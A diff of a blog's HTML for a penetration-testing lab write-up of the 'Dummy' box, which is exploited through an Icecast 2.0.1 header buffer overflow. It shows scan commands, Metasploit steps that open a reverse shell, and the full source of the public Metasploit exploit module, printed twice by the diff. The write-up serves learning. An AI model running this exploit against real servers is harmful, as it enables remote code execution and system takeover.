@@ -79,23 +79,23 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys this is my write-up about Dummy from <a href="https://labs.wizard-security.net/" target="_blank" rel="noopener noreferrer">Wizard Labs</a>. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in.
-<img src="/images/wizardlabs/dummy/0.png" alt=""></p>
+<br><img src="/images/wizardlabs/dummy/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As we always do we will start by scanning the box with nmap , so :
 <code class="highlighter-rouge">nmap -sV -sT -sC 10.1.1.13</code>
-<img src="/images/wizardlabs/dummy/1.png" alt="">
+<br><img src="/images/wizardlabs/dummy/1.png" alt=""><br>
 <br> We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap
 <code class="highlighter-rouge">smbmap -H 10.1.1.13</code>
-<img src="/images/wizardlabs/dummy/2.png" alt="">
+<br><img src="/images/wizardlabs/dummy/2.png" alt=""><br>
 <br> And we immediately get Access Denied so smb is not helpful here.
 <br> On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running <a href="http://icecast.org/" target="_blank" rel="noopener noreferrer">Icecast streaming media server</a>. Let’s check that port
 <br></p>
 <hr>
 
 <h2 id="icecast">Icecast</h2>
-<p><img src="/images/wizardlabs/dummy/3.png" alt="">
+<p><br><img src="/images/wizardlabs/dummy/3.png" alt=""><br>
 <br> If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much.
 <br> By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote code execution (RCE). And we also find a <a href="https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header" target="_blank" rel="noopener noreferrer">metasploit module</a> . So let’s open metasploit and search for icecast modules.
 <br></p>
@@ -103,38 +103,36 @@
 
 <h2 id="metasploit">Metasploit</h2>
 <p><br> By doing <code class="highlighter-rouge">search icecast</code> we will find the module , and it’s an exploit from 2004. 
-<img src="/images/wizardlabs/dummy/4.png" alt="">
-<code class="highlighter-rouge">use windows/http/icecast_header</code>
-<br>
-<code class="highlighter-rouge">set LHOST 10.253.xx.xx</code>
-<br>
-<code class="highlighter-rouge">set RHOST 10.1.1.13</code>
-<br>
-<code class="highlighter-rouge">exploit</code>
-<img src="/images/wizardlabs/dummy/5.png" alt="">
+<br><img src="/images/wizardlabs/dummy/4.png" alt=""></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use windows/http/icecast_header
+set LHOST 10.253.xx.xx
+set RHOST 10.1.1.13
+exploit
+</code></pre></div></div>
+<p><img src="/images/wizardlabs/dummy/5.png" alt=""><br>
 <br> And we got a meterpreter session. we can drop a shell by typing <code class="highlighter-rouge">shell</code> then if we type <code class="highlighter-rouge">whoami</code> we will find that we are already Administrator so no need for privilege escalation
-<img src="/images/wizardlabs/dummy/6.png" alt="">
+<br><img src="/images/wizardlabs/dummy/6.png" alt=""><br>
 <br> Then we can grab the flags 
-<img src="/images/wizardlabs/dummy/7.png" alt=""></p>
+<br><img src="/images/wizardlabs/dummy/7.png" alt=""><br></p>
 <hr>
 
 <h2 id="header-overwrite">Header Overwrite</h2>
 <p><br> So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed
 <br> So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/icecast_header.rb" target="_blank" rel="noopener noreferrer">source</a> of the module :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##
-# This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
-##
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##</span>
+<span class="c1"># This module requires Metasploit: https://metasploit.com/download</span>
+<span class="c1"># Current source: https://github.com/rapid7/metasploit-framework</span>
+<span class="c1">##</span>
 
-class MetasploitModule &lt; Msf::Exploit::Remote
-  Rank = GreatRanking
+<span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+  <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
 
-  include Msf::Exploit::Remote::Tcp
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
 
-  def initialize(info = {})
-    super(update_info(info,
-      'Name'           =&gt; 'Icecast Header Overwrite',
-      'Description'    =&gt; %q{
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
+    <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+      <span class="s1">'Name'</span>           <span class="o">=&gt;</span> <span class="s1">'Icecast Header Overwrite'</span><span class="p">,</span>
+      <span class="s1">'Description'</span>    <span class="o">=&gt;</span> <span class="sx">%q{
         This module exploits a buffer overflow in the header parsing of icecast
         versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32
         HTTP headers will cause a write one past the end of a pointer array. On
@@ -147,73 +145,73 @@ class MetasploitModule &lt; Msf::Exploit::Remote
         This means for each time your payload exits, the counter will be left
         incremented, and eventually the threadpool limit will be maxed. So you
         can multihit, but only till you fill the threadpool.
-      },
-      'Author'         =&gt; [ 'spoonm', 'Luigi Auriemma &lt;aluigi[at]autistici.org&gt;' ],
-      'License'        =&gt; MSF_LICENSE,
-      'References'     =&gt;
-        [
-          [ 'CVE', '2004-1561'],
-          [ 'OSVDB', '10406'],
-          [ 'BID', '11271'],
-          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
-        ],
-      'Privileged'     =&gt; false,
-      'DefaultOptions' =&gt;
-        {
-          'EXITFUNC' =&gt; 'thread',
-        },
-      'Payload'        =&gt;
-        {
-          'Space'    =&gt; 2000,
-          'BadChars' =&gt; "\x0d\x0a\x00",
-          'DisableNops' =&gt; true,
-          'StackAdjustment' =&gt; -3500,
-        },
-      'Platform'       =&gt; 'win',
-      'Targets'        =&gt;
-        [
-          [ 'Automatic', { }],
-        ],
-      'DisclosureDate' =&gt; 'Sep 28 2004',
-      'DefaultTarget' =&gt; 0))
+      }</span><span class="p">,</span>
+      <span class="s1">'Author'</span>         <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'spoonm'</span><span class="p">,</span> <span class="s1">'Luigi Auriemma &lt;aluigi[at]autistici.org&gt;'</span> <span class="p">],</span>
+      <span class="s1">'License'</span>        <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+      <span class="s1">'References'</span>     <span class="o">=&gt;</span>
+        <span class="p">[</span>
+          <span class="p">[</span> <span class="s1">'CVE'</span><span class="p">,</span> <span class="s1">'2004-1561'</span><span class="p">],</span>
+          <span class="p">[</span> <span class="s1">'OSVDB'</span><span class="p">,</span> <span class="s1">'10406'</span><span class="p">],</span>
+          <span class="p">[</span> <span class="s1">'BID'</span><span class="p">,</span> <span class="s1">'11271'</span><span class="p">],</span>
+          <span class="p">[</span> <span class="s1">'URL'</span><span class="p">,</span> <span class="s1">'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'</span><span class="p">],</span>
+        <span class="p">],</span>
+      <span class="s1">'Privileged'</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+      <span class="s1">'DefaultOptions'</span> <span class="o">=&gt;</span>
+        <span class="p">{</span>
+          <span class="s1">'EXITFUNC'</span> <span class="o">=&gt;</span> <span class="s1">'thread'</span><span class="p">,</span>
+        <span class="p">},</span>
+      <span class="s1">'Payload'</span>        <span class="o">=&gt;</span>
+        <span class="p">{</span>
+          <span class="s1">'Space'</span>    <span class="o">=&gt;</span> <span class="mi">2000</span><span class="p">,</span>
+          <span class="s1">'BadChars'</span> <span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x0d\x0a\x00</span><span class="s2">"</span><span class="p">,</span>
+          <span class="s1">'DisableNops'</span> <span class="o">=&gt;</span> <span class="kp">true</span><span class="p">,</span>
+          <span class="s1">'StackAdjustment'</span> <span class="o">=&gt;</span> <span class="o">-</span><span class="mi">3500</span><span class="p">,</span>
+        <span class="p">},</span>
+      <span class="s1">'Platform'</span>       <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
+      <span class="s1">'Targets'</span>        <span class="o">=&gt;</span>
+        <span class="p">[</span>
+          <span class="p">[</span> <span class="s1">'Automatic'</span><span class="p">,</span> <span class="p">{</span> <span class="p">}],</span>
+        <span class="p">],</span>
+      <span class="s1">'DisclosureDate'</span> <span class="o">=&gt;</span> <span class="s1">'Sep 28 2004'</span><span class="p">,</span>
+      <span class="s1">'DefaultTarget'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
 
-    register_options(
-      [
-        Opt::RPORT(8000)
-      ])
-  end
+    <span class="n">register_options</span><span class="p">(</span>
+      <span class="p">[</span>
+        <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">8000</span><span class="p">)</span>
+      <span class="p">])</span>
+  <span class="k">end</span>
 
-  # Interesting that ebp is pushed after the local variables, and the line array
-  # is right before the saved eip, so overrunning it just by 1 element overwrites
-  # eip, making an interesting exploit....
-  # .text:00414C00                 sub     esp, 94h
-  # .text:00414C06                 push    ebx
-  # .text:00414C07                 push    ebp
-  # .text:00414C08                 push    esi
+  <span class="c1"># Interesting that ebp is pushed after the local variables, and the line array</span>
+  <span class="c1"># is right before the saved eip, so overrunning it just by 1 element overwrites</span>
+  <span class="c1"># eip, making an interesting exploit....</span>
+  <span class="c1"># .text:00414C00                 sub     esp, 94h</span>
+  <span class="c1"># .text:00414C06                 push    ebx</span>
+  <span class="c1"># .text:00414C07                 push    ebp</span>
+  <span class="c1"># .text:00414C08                 push    esi</span>
 
-  def exploit
-    connect
+  <span class="k">def</span> <span class="nf">exploit</span>
+    <span class="n">connect</span>
 
-    # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
-    # jmp 12
-    evul = "\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n"
-    evul &lt;&lt; "Accept: text/html\r\n" * 31;
+    <span class="c1"># bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)</span>
+    <span class="c1"># jmp 12</span>
+    <span class="n">evul</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\xeb\x0c</span><span class="s2"> / HTTP/1.1 </span><span class="si">#{</span><span class="n">payload</span><span class="p">.</span><span class="nf">encoded</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">"</span>
+    <span class="n">evul</span> <span class="o">&lt;&lt;</span> <span class="s2">"Accept: text/html</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">31</span><span class="p">;</span>
 
-    # jmp [esp+4]
-    evul &lt;&lt; "\xff\x64\x24\x04\r\n"
-    evul &lt;&lt; "\r\n"
+    <span class="c1"># jmp [esp+4]</span>
+    <span class="n">evul</span> <span class="o">&lt;&lt;</span> <span class="s2">"</span><span class="se">\xff\x64\x24\x04\r\n</span><span class="s2">"</span>
+    <span class="n">evul</span> <span class="o">&lt;&lt;</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span>
 
-    sock.put(evul)
+    <span class="n">sock</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">evul</span><span class="p">)</span>
 
-    handler
-    disconnect
-  end
-end
+    <span class="n">handler</span>
+    <span class="n">disconnect</span>
+  <span class="k">end</span>
+<span class="k">end</span>
 
 </code></pre></div></div>
 <p><br> There’s not much detail because it’s based on metasploit so luckily I found this <a href="https://securitytracker.com/id/1011439" target="_blank" rel="noopener noreferrer">refrence</a> which had a poc c code. 
 <br> By looking at this part of the code :
-<img src="/images/wizardlabs/dummy/8.png" alt="">
+<br><img src="/images/wizardlabs/dummy/8.png" alt=""><br>
 <br> We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode.
 <br> If you want to know more about bufferOverFlows check out my <a href="/categories">other articles</a>
 <br>
